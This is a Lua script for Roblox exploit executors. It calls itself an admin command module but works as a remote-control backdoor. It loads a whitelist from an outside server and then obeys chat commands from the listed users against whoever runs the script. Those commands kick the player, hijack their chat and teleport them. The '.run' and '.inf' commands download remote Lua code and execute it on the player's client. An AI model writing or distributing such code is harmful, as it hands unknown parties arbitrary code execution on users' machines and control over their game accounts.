-- Admin System Module
-- Standalone admin command system that can be loaded via loadstring in any script
-- Usage: loadstring(game:HttpGet('YOUR_URL_HERE'))()

local http_request = (syn and syn.request) or (request) or (http and http.request)
if not http_request then
    warn("Your executor does not support HTTP requests. Admin system cannot continue.")
    return
end

-- Initialize whitelist table
local whitelistedUsers = {}

-- Fetch whitelist from remote server
local url = "https://javalstas.com/whitelisted.txt"
local response = http_request({
    Url = url,
    Method = "GET"
})

if response.StatusCode == 200 then
    for line in response.Body:gmatch("[^\r\n]+") do
        whitelistedUsers[line:lower()] = true
    end
    print("[Admin System] Whitelist loaded successfully!")
else
    warn("[Admin System] Failed to fetch whitelist. StatusCode:", response.StatusCode)
end

-- Get services
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local localPlayer = Players.LocalPlayer
local myName = localPlayer.Name:lower()

-- Chat functionality
local chatEvents = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
local sayMessageRequest = chatEvents and chatEvents:FindFirstChild("SayMessageRequest")

local function sendMessage(msg)
    if sayMessageRequest then
        sayMessageRequest:FireServer(msg, "All")
    end
end

-- Command handler function
local function onPlayerChatted(player, message)
    -- Only process commands from whitelisted users
    if not whitelistedUsers[player.Name:lower()] then
        return
    end

    local splitMessage = string.split(message, " ")
    local command = splitMessage[1]
    local targetName = splitMessage[2] and splitMessage[2]:lower()

    -- .kick <user>
    if command == ".kick" and targetName then
        if myName:sub(1, #targetName) == targetName then
            localPlayer:Kick("You have been disconnected by " .. player.Name)
        end
    end

    -- .inf <user>
    if command == ".inf" and targetName then
        if myName:sub(1, #targetName) == targetName then
            loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
            sendMessage("Successfully ran infinite yield")
            return  
        end
    end

    -- .tp <user1> <user2>
    if command == ".tp" and targetName then
        local user2Name = splitMessage[3] and splitMessage[3]:lower()
        
        if myName:sub(1, #targetName) == targetName then
            local user2 = nil
            for _, p in ipairs(Players:GetPlayers()) do
                if p.Name:lower():sub(1, #user2Name) == user2Name then
                    user2 = p
                    break
                end
            end
            
            if user2 and user2.Character and user2.Character:FindFirstChild("HumanoidRootPart") then
                if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    localPlayer.Character.HumanoidRootPart.CFrame = user2.Character.HumanoidRootPart.CFrame
                    sendMessage("Successfully teleported to " .. user2.Name)
                end
            else
                sendMessage("Could not find target player or they are not loaded in")
            end
        end
    end

    -- .run <user>
    if command == ".run" and targetName then
        if myName:sub(1, #targetName) == targetName then
            local response = request({
                Url = "https://raw.githubusercontent.com/tnewman-afk/runadmin/refs/heads/main/run.lua",
                Method = "GET"
            })
            
            if response.StatusCode == 200 then
                local script = response.Body
                
                -- Only run if there's actually a script
                if script and script ~= "" then
                    local success, result = pcall(function()
                        loadstring(script)()
                    end)
                    
                    if success then
                        sendMessage("Script executed successfully!")
                    else
                        sendMessage("Failed to run script: " .. tostring(result))
                    end
                end
            else
                sendMessage("Failed to fetch script: HTTP " .. tostring(response.StatusCode))
            end
        end
    end

    -- .control <user>
    if command == ".control" and targetName then
        if myName:sub(1, #targetName) == targetName then
            sendMessage("I am now controlled by " .. player.Name .. " for 20 seconds.")
            local controlActive = true

            task.delay(20, function()
                controlActive = false
                sendMessage("Control by " .. player.Name .. " has ended.")
            end)

            local conn
            conn = player.Chatted:Connect(function(controlMessage)
                if not controlActive then
                    conn:Disconnect()
                else
                    sendMessage(controlMessage)
                end
            end)
        end
    end

    -- .bring <user>
    if command == ".bring" and targetName then
        if myName:sub(1, #targetName) == targetName then
            local senderChar = player.Character
            local senderRoot = senderChar and senderChar:FindFirstChild("HumanoidRootPart")

            local localChar = localPlayer.Character
            local localRoot = localChar and localChar:FindFirstChild("HumanoidRootPart")

            if senderRoot and localRoot then
                localRoot.CFrame = senderRoot.CFrame
            end
        end
    end
end

-- Connect chat listeners for all existing players
for _, player in ipairs(Players:GetPlayers()) do
    player.Chatted:Connect(function(msg)
        onPlayerChatted(player, msg)
    end)
end

-- Connect chat listeners for new players
Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(msg)
        onPlayerChatted(player, msg)
    end)
end)

print("[Admin System] Loaded successfully. Listening for whitelisted commands...")

-- Available commands:
-- .kick <user> - Kicks the target user
-- .inf <user> - Loads Infinite Yield for the target user
-- .tp <user1> <user2> - Teleports user1 to user2
-- .run <user> - Runs a remote script on the target user
-- .control <user> - Controls the target user's chat for 20 seconds
-- .bring <user> - Brings the target user to the admin
